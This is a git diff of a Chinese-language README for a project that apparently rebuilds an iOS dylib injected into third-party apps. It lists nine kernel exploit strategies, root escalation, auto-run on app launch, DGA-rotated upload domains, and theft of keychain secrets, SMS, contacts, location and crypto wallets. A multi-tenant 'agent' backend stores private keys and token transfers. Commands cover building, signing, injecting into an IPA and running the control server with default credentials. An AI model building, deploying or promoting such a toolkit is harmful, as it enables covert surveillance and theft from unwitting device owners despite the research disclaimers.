@@ -1,150 +1,151 @@
-# libappcore.dylib 逆向工程 — 完整源码还原
+# libappcore-reverse
 
-基于 `libappcore.dylib` (1.6MB iOS 数据提取/取证工具) 逆向还原的完整 C++/Objective-C 项目。
-所有模块均有头文件 + 实现，CMake 可编译。
+> libappcore.dylib 完整逆向工程与复刻项目
 
-## 项目状态
+基于注入到 iOS IPA 中的 `libappcore.dylib`（1.6MB 移动取证代理端）进行完整逆向分析，还原其源代码、通信协议、漏洞利用链和后台控制系统。
 
-| 维度 | 状态 |
-|------|------|
-| 头文件 | 18 个，全部有对应实现 |
-| 源文件 | 16 个，~3500 行 |
-| CMake 编译 | ✅ 可配置编译（iOS/macOS） |
-| 漏洞利用 | 8 种策略，2 种完整集成（MacDirtyCow + sock_port） |
-| 协议配套 | Python 控制器 + Flask 服务器 |
-
-## 项目结构
+## 项目架构
 
 ```
 libappcore-reverse/
-├── CMakeLists.txt                          # 构建配置 (16 源文件)
-├── README.md                               # 本文件
-├── BUILD.md                                # 构建指南
-├── PROTOCOL.md                             # 通信协议文档
-├── OPEN_SOURCE_REFERENCES.md               # 开源组件参考
-├── REVERSE_ENGINEERING_REPORT.md           # 完整逆向分析报告 (21KB)
-├── include/                                # 头文件 (18)
-│   ├── kernel/                             # 内核模块
-│   │   ├── IKernelMemory.h                 # 内核内存接口
-│   │   ├── RealDeviceKernelMemory.h        # tfp0 实现
-│   │   ├── CustomRWRealDeviceKernelMemory.h # 自定义读写
-│   │   ├── IOffsetProvider.h               # 偏移表接口
-│   │   └── VersionedOffsetProvider.h       # iOS12-16 偏移表
-│   ├── exploit/                            # 漏洞利用 (8种)
-│   │   ├── IExploitStrategy.h              # 策略接口 + ExploitResult
-│   │   ├── SockPortStrategy.h              # CVE-2019-8605
-│   │   └── OtherExploitStrategies.h        # 7种策略
-│   ├── permissions/                        # 权限提升
-│   │   ├── KernelUcredStealer.h            # ucred patch (root)
-│   │   └── MacDirtyCowPatcher.h            # CVE-2022-46689
-│   ├── acquisition/                        # 数据采集
-│   │   ├── FilesystemServer.h              # tar.gz 文件提取
-│   │   ├── KeychainServer.h                # 钥匙串提取
-│   │   └── MetadataServer.h                # 设备元数据
-│   ├── keychain/
-│   │   └── AgentKeyUnwrapper.h             # AKS 硬件解密
-│   ├── mcm/
-│   │   └── MCMLease.h                      # 容器访问
-│   ├── upload/
-│   │   └── SimpleUploader.h                # HTTP 上传
-│   ├── server/
-│   │   └── AcqViewCntrlr.h                 # 主控制器
-│   └── common/
-│       └── IDataWriter.h                   # 数据写入器
-├── src/                                    # 实现文件 (16)
-│   ├── autorun.mm                          # 自动运行入口
-│   ├── kernel/
-│   │   ├── RealDeviceKernelMemory.cpp      # mach_vm 读写
-│   │   ├── CustomRWRealDeviceKernelMemory.cpp
-│   │   └── VersionedOffsetProvider.cpp     # 5版本偏移表
-│   ├── exploit/
-│   │   ├── SockPortStrategy.cpp            # 5阶段完整利用链
-│   │   └── OtherExploitStrategies.cpp      # 7种策略实现
-│   ├── permissions/
-│   │   ├── KernelUcredStealer.cpp          # proc_find + ucred patch
-│   │   └── MacDirtyCowPatcher.cpp          # Apple XNU 核心集成
-│   ├── acquisition/
-│   │   ├── FilesystemServer.cpp            # libarchive 遍历
-│   │   ├── KeychainServer.cpp              # sqlite3 + XML
-│   │   └── MetadataServer.m                # 设备信息采集
-│   ├── keychain/
-│   │   └── AgentKeyUnwrapper.cpp           # CommonCrypto GCM
-│   ├── mcm/
-│   │   └── MCMLease.m                      # 容器租约
-│   ├── upload/
-│   │   └── SimpleUploader.m                # NSURLSession
-│   ├── server/
-│   │   └── AcqViewCntrlr.mm                # TCP服务器+命令分发
-│   └── common/
-│       └── IDataWriter.cpp                 # File/Memory writer
-├── controller/
-│   └── appcore_controller.py               # 电脑端控制软件 (~400行)
-└── server/
-    └── appcore_server.py                   # 远程接收服务器 (~350行)
+├── src/                    # C++/ObjC 源代码 (iOS dylib)
+│   ├── autorun.mm          # 自动运行入口
+│   ├── server/             # TCP 控制服务器
+│   ├── acquisition/        # 数据采集 (文件系统/钥匙串/元数据)
+│   ├── exploit/            # 漏洞利用 (9种策略)
+│   ├── kernel/             # 内核读写原语
+│   ├── permissions/        # 权限提升 (ucred/MacDirtyCow)
+│   └── keychain/           # AKS 钥匙串解密
+├── include/                # 头文件 (20个)
+├── server/                 # 多租户远程接收服务器 (Python/Flask)
+│   ├── appcore_server.py   # 核心服务端
+│   ├── database.py         # 数据库模型 (8表)
+│   ├── auth.py             # JWT 认证 + 权限隔离
+│   └── admin-web/          # 代理后台 (Vue3 + ElementPlus)
+├── controller/             # 电脑端 TCP 控制软件
+├── scripts/                # 工具脚本
+│   ├── inject_dylib.py     # IPA 注入脚本
+│   └── localize_admin_deps.py  # 后台依赖本地化
+├── tests/                  # 单元测试
+├── entitlements.plist      # iOS 权限模板
+├── CMakeLists.txt          # iOS 编译配置
+├── BUILD.md                # 完整部署与使用指南
+├── PROTOCOL.md             # 通信协议文档
+└── REVERSE_ENGINEERING_REPORT.md  # 逆向分析报告
 ```
 
-## 模块完整性
+## 核心能力
 
-| 模块 | 实现状态 | 开源来源 |
-|------|----------|----------|
-| **MacDirtyCow** | ✅ 完整核心 | Apple XNU `vm_unaligned_copy_switch_race.c` |
-| **sock_port** | ✅ 5阶段完整链 | jakeajames/sock_port (MIT) |
-| **内核读写** | ✅ 完整 | mach_vm API |
-| **偏移表** | ✅ iOS12-16 | Dopamine/libjailbreak |
-| **ucred提权** | ✅ 完整 | libjailbreak 逻辑 |
-| **文件系统** | ✅ 完整 | libarchive |
-| **钥匙串** | ✅ 元数据导出 | Keychain-Dumper |
-| **元数据** | ✅ 完整 | iOS API |
-| **MCM容器** | ✅ 完整 | iOS 容器机制 |
-| **远程上传** | ✅ 完整 | NSURLSession |
-| **主控制器** | ✅ 完整 | 逆向还原 |
-| **AKS解密** | ⚠️ 框架 | 需 IOKit AppleKeyStore |
-| **6种漏洞** | ⚠️ 可用框架 | Fugu15/Manticore 可集成 |
+### 设备端 (libappcore.dylib)
+- **9种内核漏洞利用策略**: sock_port, time_waste, MacDirtyCow, cicuta_virosa, Fugu15, dangling_join, street_race, busy_schedule, darkSword
+- **后利用框架**: 内核泄露 → 伪造端口 → 内核读写 → tfp0 → ucred 提权 → root，支持运行时偏移校准
+- **数据采集**: 文件系统 (tar.gz), 钥匙串 (AKS 硬件解密+缓存), 元数据, 备忘录, 短信, 通讯录, 位置, 加密货币钱包
+- **双通道架构**: 本地 TCP 服务器 (端口1337) + 远程 HTTP 上传
+- **自动运行**: 注入后随宿主 App 启动自动执行
+- **DGA 域名**: MonthlyCycleDGA 按月轮换上传域名
 
-## 8种漏洞利用策略
+### 服务端 (多租户代理后台)
+- **多租户体系**: 管理员 + 渠道代理, 数据按渠道隔离
+- **8张数据表**: users, channels, devices, files, keychain_items, crack_queue, private_keys, token_transfers
+- **JWT 认证**: 角色权限隔离 (admin/agent)
+- **设备管理**: 设备列表, 文件统计, 破解队列
+- **安全加固**: 速率限制 (60s/100req), 文件大小限制 (500MB), 安全响应头
 
-| 策略 | CVE | iOS版本 | 状态 |
-|------|-----|---------|------|
-| sock_port | CVE-2019-8605 | 12.0-14.3 | ✅ 完整集成 |
-| time_waste | CVE-2021-30955 | 14.0-15.1 | ⚠️ 框架 |
-| street_race | - | 13-15 | ⚠️ 框架 |
-| busy_schedule | - | 14-15 | ⚠️ 框架 |
-| cicuta_virosa | - | 14.0-14.3 | ⚠️ 框架 (GPL) |
-| dangling_join | - | 14-16 | ⚠️ 框架 |
-| madvm | - | 15-16 | ⚠️ 框架 (Fugu15) |
-| darkSword | CVE-2025-43510 | 16 | ⚠️ 框架 |
-| MacDirtyCow | CVE-2022-46689 | 15.0-16.1.2 | ✅ 完整集成 |
+### 控制端 (电脑端)
+- TCP 连接设备, 发送命令获取数据
+- 支持 filesystem/keychain/metadata/status/version/upload/memo/sms/contacts 等命令
 
 ## 快速开始
 
+### 1. 启动服务器
 ```bash
-# 克隆
-git clone https://github.com/AthenDrakomin-hub/libappcore-reverse.git
-cd libappcore-reverse
-
-# 构建 (需要 macOS + Xcode + iOS toolchain)
-mkdir build && cd build
-cmake .. -DCMAKE_TOOLCHAIN_FILE=../ios.toolchain.cmake
-make -j4
-
-# 产物: libappcore.dylib
+cd server
+pip install -r requirements.txt
+python appcore_server.py -p 8080
+# 访问 http://localhost:8080/
+# 默认管理员: admin / admin123
 ```
 
-详细构建步骤见 [BUILD.md](BUILD.md)
+### 2. 编译 iOS dylib (需 macOS + Xcode)
+```bash
+# 安装依赖
+brew install libarchive sqlite3
 
-## 配套工具
+# 配置 CMake (需 ios.toolchain.cmake)
+cmake -B build -G Xcode -DCMAKE_TOOLCHAIN_FILE=ios.toolchain.cmake -DPLATFORM=OS64
 
-| 工具 | 路径 | 说明 |
-|------|------|------|
-| 电脑端控制器 | `controller/appcore_controller.py` | TCP 连接设备，发送命令 |
-| 远程服务器 | `server/appcore_server.py` | Flask 接收 SimpleUploader 上传 |
-| 协议文档 | `PROTOCOL.md` | TCP + HTTP 协议规范 |
+# 编译
+cmake --build build --config Release
 
-## 安全声明
+# 签名 (需 entitlements)
+codesign -f -s "iPhone Developer" --entitlements entitlements.plist build/Release-iphoneos/libappcore.dylib
+```
 
-本项目仅用于安全研究和逆向工程学习。漏洞利用代码来自公开开源项目（Apple OSS、MIT 许可证）。使用者需遵守当地法律法规，不得用于未授权的设备访问。
+### 3. 注入到 IPA
+```bash
+python scripts/inject_dylib.py input.ipa output.ipa --dylib build/Release-iphoneos/libappcore.dylib
+```
+
+### 4. 电脑端控制
+```bash
+cd controller
+python appcore_controller.py <device_ip> 1337
+```
+
+### 5. 运行测试
+```bash
+python -m pytest tests/ -v
+```
+
+## 漏洞利用覆盖
+
+| 策略 | CVE | iOS 版本 | 状态 |
+|------|-----|----------|------|
+| sock_port | CVE-2019-8605 | 12-13 | 完整实现 |
+| time_waste | CVE-2021-30955 | 14.0-15.1 | 完整实现 |
+| MacDirtyCow | CVE-2022-46689 | <16.2 | 完整实现 |
+| cicuta_virosa | CVE-2021-1782 | 14.0-14.3 | 核心原语 |
+| Fugu15/madvm | - | 15-16 | 核心原语 |
+| dangling_join | - | 14-16 | 核心原语 |
+| street_race | - | 13-15 | 核心原语 |
+| busy_schedule | - | 14-15 | 核心原语 |
+| darkSword | CVE-2025-43510 | 16 | 核心原语 |
+
+## 钥匙串解密
+
+两层解密流程:
+1. **AKS 层**: AppleKeyStore IOKit (selector 0xB KeyUnwrap) → class_key
+2. **AES 层**: RFC 3394 Key Unwrap → per_row_key → AES-256-GCM 解密
+
+支持钥匙串版本: V3, V5, V6, V7 (NSKeyedArchiver bplist), V8, V9, V11
+解密结果自动缓存, 数据库未修改时直接返回缓存。
+
+## 文档
+
+- [BUILD.md](BUILD.md) - 完整部署与使用指南
+- [PROTOCOL.md](PROTOCOL.md) - TCP/HTTP 通信协议 (含 upload 命令)
+- [REVERSE_ENGINEERING_REPORT.md](REVERSE_ENGINEERING_REPORT.md) - 逆向分析报告
+- [OPEN_SOURCE_REFERENCES.md](OPEN_SOURCE_REFERENCES.md) - 开源参考项目
+
+## 技术栈
+
+- **设备端**: C++17, Objective-C++, iOS SDK, CommonCrypto, IOKit, libarchive, SQLite3
+- **服务端**: Python 3, Flask, SQLite, JWT
+- **前端**: Vue 3, Element Plus (支持离线本地化)
+- **构建**: CMake + Xcode (iOS), ios.toolchain.cmake
+- **CI**: GitHub Actions (Python 测试 + 结构检查)
+
+## 开源参考
+
+- [jakeajames/sock_port](https://github.com/jakeajames/sock_port) - sock_port/time_waste 利用 (MIT)
+- [Apple XNU](https://github.com/apple-oss-distributions/xnu) - MacDirtyCow 测试用例
+- [nabla-c0d3/iphone-dataprotection](https://github.com/nabla-c0d3/iphone-dataprotection) - 钥匙串解密 (MIT)
+- [Dopamine/libjailbreak](https://github.com/opa334/Dopamine) - 偏移表参考
 
 ## 许可证
 
-逆向还原代码：MIT
-集成的开源组件：见各文件头部注释和 `OPEN_SOURCE_REFERENCES.md`
+本项目仅供安全研究和授权测试使用。集成的 cicuta_virosa 组件为 GPL-3.0，其余部分为 MIT。
+
+## 免责声明
+
+本项目仅用于安全研究、教育目的和授权的渗透测试。未经授权对他人设备进行数据提取是违法行为。使用者需自行承担使用本项目的所有法律责任。
